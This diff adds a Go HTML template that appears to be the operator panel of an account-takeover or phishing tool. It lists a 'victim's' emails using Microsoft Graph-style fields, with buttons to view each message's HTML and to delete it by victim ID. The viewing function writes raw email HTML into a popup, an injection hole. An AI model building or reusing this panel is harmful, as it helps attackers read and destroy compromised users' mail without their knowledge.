@@ -1,0 +1,63 @@
+{{define "title"}}Mails{{end}}
+{{define "content"}}
+<div class="container">
+    <div class="row">
+        <div class="col-md-12">
+            <h1 class="display-4 fw-bold">Emails</h1>
+        </div>
+    </div>
+
+    <table class="table table-striped table-hover mt-4">
+        <thead>
+            <tr>
+                <th scope="col">From</th>
+                <th scope="col">To</th>
+                <th scope="col">Subject</th>
+                <th scope="col">Sent Date</th>
+                <th scope="col">Action</th>
+            </tr>
+        </thead>
+        <tbody>
+            {{ $victimID := .Data.VictimID }}
+            {{range $email := .Data.emails}}
+            <tr>
+                <td>{{ $email.from.emailAddress.address }}</td>
+                {{if $email.toRecipients}}
+                <td>
+                    {{range $email.toRecipients}}
+                    <span class="badge bg-secondary">{{ .emailAddress.address }}</span>
+                    {{end}}
+                </td>
+                {{else}}
+                <td class="text-muted">No recipients</td>
+                {{end}}
+                <td>{{ $email.subject }}</td>
+                <td><span class="text-muted">{{ $email.sentDateTime }}</span></td>
+                <td class="d-flex gap-2">
+                    <button class="btn btn-primary btn-sm" onclick="viewHtmlpopup('{{ $email.body.content }}')">View HTML</button>
+                    <a href="/emails/{{$victimID}}/delete/{{ $email.id }}" class="btn btn-danger btn-sm">Delete Email</a>
+                </td>
+            </tr>
+            {{end}}
+        </tbody>
+    </table>
+
+    <div class="mb-4"></div>
+</div>
+
+<script>
+    function copyToClipboard(text) {
+        navigator.clipboard.writeText(text).then(function () {
+            alert('Link copied to clipboard!');
+        }, function (err) {
+            console.error('Could not copy text: ', err);
+        });
+    }
+
+    function viewHtmlpopup(htmlContent) {
+        const popup = window.open("", "Email HTML", "width=800,height=600");
+        popup.document.write(htmlContent);
+        popup.document.close();
+    }
+</script>
+{{end}}
